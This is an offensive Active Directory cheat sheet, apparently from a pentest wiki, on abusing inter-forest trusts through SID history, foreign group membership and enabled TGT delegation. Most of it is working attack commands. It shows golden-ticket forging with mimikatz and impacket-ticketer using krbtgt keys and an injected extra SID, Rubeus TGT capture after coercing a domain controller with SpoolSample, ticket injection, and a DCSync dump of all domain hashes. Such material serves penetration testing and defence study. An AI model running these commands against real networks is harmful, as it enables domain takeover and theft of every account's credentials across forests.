## Abusing Inter-Forest trust with enabled SID history [t-ad-trusts-sid_history]

When doing Kerberos authentications across trusts, the trusting domain's domain controller checks a 
few things before handing out service tickets to trusted users: SID filtering during PAC validation 
(looking in the ExtraSids attribute from the KERB_VALIDATION_INFO structure in the PAC), 
TGT delegation verification (when asked for a Service Ticket for a service configured for unconstrained delegation), 
and Selective Authentication limitation.

If the AD is in migration SID history can be enabled:
netdom trust chudamax.local /d:hpbank.local /enablesidhistory:yes

(it would set the TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL attribure to True)


In this case it is possible to inject SIDs with RIDs>=1000, but only groups with membership in local security groups 
(built-in) are not filtered. If we try to use group which is a part of domain or eneterprise admins it will fail.


###  Forge a new ticket and add an extra SID




**option 1: mimikatz**

{% code overflow="wrap" %}
```bash
Get-DomainGroupMember -Identity "Administrators" -Domain chudamax.local
kerberos::golden /user:Administrator /domain:hpbank.local /sid:S-1-5-21-748831818-4028602677-2506688269 /krbtgt:af5dcc231b2bca873aedd08ba47ab26d /sids:S-1-5-21-921686000-571080924-1984760626-1115 /ptt

```
{% endcode %}


**option 2: impacket**

{% code overflow="wrap" %}
```bash
#impacket-ticketer -aesKey <compromised_domain_krbtgt_aesKey> -domain-sid "<compromised_domain_sid>" -domain "<compromised_domain>" -extra-sid "<external_group_SID-RID>" Administrator
impacket-ticketer -aesKey b0a77ec59870c03d6bae238522a919d3a7d87d403fa1720660527f2bcbae8da1 -domain-sid "S-1-5-21-748831818-4028602677-2506688269" -domain "hpbank.local" -extra-sid "S-1-5-21-921686000-571080924-1984760626-1115" Administrator

```
{% endcode %}

## Abusing Inter-Forest trust with Foreign Group Memberships [t-ad-trusts-foreign_groups]

Abusing Inter-Forest trust with Foreign Group Memberships

###  Check for users in foreign domain groups



{% code overflow="wrap" %}
```bash
Get-DomainForeignGroupMember -Domain chudamax.local
convertfrom-sid <sid>

```
{% endcode %}

## Abusing Inter-Forest trust with Enabled TGTDelegation [t-ad-trusts-tgt_delegation]

In 2018 Will Schroeder found a way to compromise forests using unconstrained delegation.
In 2019, Microsoft issued two rounds of security advisories and updates. The first blocked TGT delegation for all new forest trusts, 
while the second blocked it for existing forest trust as well.

It is still can be enabled manually:
netdom.exe trust chudamax.com /domain:hpbank.local /EnableTGTDelegation:Yes


###  Forge a new ticket and add an extra SID



{% code overflow="wrap" %}
```bash
#Start monitoring for TGTs with rubeus:
Rubeus.exe monitor /interval:5 /filteruser:target-dc$

#Execute the printerbug to trigger the force authentication of the target DC to our machine
SpoolSample.exe target-dc$.external.forest.local dc.compromised.domain.local

#Get the base64 captured TGT from Rubeus and inject it into memory:
Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>

#Dump the hashes of the target domain using mimikatz:
lsadump::dcsync /domain:external.forest.local /all

```
{% endcode %}

